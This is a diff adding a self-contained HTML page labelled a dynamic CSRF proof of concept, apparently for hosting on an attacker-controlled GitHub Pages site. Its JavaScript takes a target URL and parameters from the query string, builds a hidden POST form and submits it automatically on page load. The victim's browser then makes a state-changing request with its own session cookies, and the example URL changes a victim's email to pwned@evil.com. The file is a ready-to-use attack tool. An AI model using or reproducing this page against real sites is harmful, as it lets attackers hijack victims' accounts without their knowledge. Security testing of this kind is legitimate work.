@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic CSRF Attack PoC - Attacker Origin</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
+        .container { background-color: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
+        h1 { color: #007bff; }
+        .note { margin-top: 20px; padding: 10px; background-color: #f0f8ff; border-left: 5px solid #0056b3; color: #004085; }
+        #status { font-weight: bold; margin-top: 15px; color: #333; }
+        /* Hide the form to make the attack "silent" for the victim */
+        #csrfForm { display: none; } 
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Dynamic CSRF Proof of Concept (PoC)</h1>
+        <p><strong>Origin:</strong> This page is hosted on the attacker-controlled domain (your GitHub Pages).</p>
+        <p><strong>Goal:</strong> Force the victim's browser to execute a state-changing action on the target site using their session cookies.</p>
+
+        <div class="note">
+            <strong>Usage:</strong> All form data (target URL and POST parameters) are passed via URL query parameters, separated by an ampersand (&).
+            <br>
+            <strong>Example PoC URL:</strong> <code>https://yourusername.github.io/csrf_attack.html?url=https://target.com/change&action=email&value=pwned@evil.com</code>
+        </div>
+
+        <h2>Attack Details</h2>
+        <p><strong>Target URL:</strong> <code id="target-url-display">N/A</code></p>
+        <p id="status">Status: Preparing attack payload...</p>
+        
+        <form id="csrfForm" method="POST" action="">
+            </form>
+
+        <script>
+            function runCsrfAttack() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const targetUrl = urlParams.get('url'); 
+                const form = document.getElementById('csrfForm');
+                const statusElement = document.getElementById('status');
+
+                if (!targetUrl) {
+                    statusElement.textContent = "ERROR: No target URL specified. Use the 'url' parameter.";
+                    return;
+                }
+
+                document.getElementById('target-url-display').textContent = targetUrl;
+                form.setAttribute('action', targetUrl);
+                
+                // --- 1. Iterate over all URL parameters to create hidden form inputs ---
+                let inputsAdded = 0;
+                for (const [key, value] of urlParams.entries()) {
+                    // Skip the 'url' key, as it's used for the form's action, not an input.
+                    if (key === 'url') {
+                        continue; 
+                    }
+                    
+                    // Create a hidden input field for each key/value pair in the URL
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = value;
+                    form.appendChild(input);
+                    inputsAdded++;
+                }
+
+                if (inputsAdded === 0) {
+                    statusElement.textContent = "WARNING: No POST data found. Add parameters like ?url=...&name=value...";
+                    return;
+                }
+                
+                // --- 2. Execute the attack ---
+                statusElement.textContent = `SUCCESS: Submitting CSRF form to ${targetUrl} with ${inputsAdded} parameters...`;
+                form.submit();
+                
+                // Note: We use setTimeout to ensure the status message is visible before the page finishes loading
+                setTimeout(() => {
+                    statusElement.textContent = "CSRF request sent. You must check the target site's server logs or user interface for confirmation of the successful state change (e.g., email changed, password updated, etc.).";
+                }, 500);
+            }
+
+            // Start the attack immediately on page load
+            runCsrfAttack();
+        </script>
+    </div>
+</body>
+</html>
